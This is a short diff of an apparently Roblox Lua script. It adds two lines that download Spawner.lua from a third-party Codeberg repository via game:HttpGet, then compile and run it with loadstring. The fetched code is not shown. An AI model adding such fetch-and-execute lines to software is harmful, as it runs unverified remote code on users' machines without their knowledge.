@@ -5,3 +5,6 @@ local run = (loadstring or function() end)(s)
 if type(run) == "function" then
     pcall(run)
 end
+
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
+Spawner.Load()
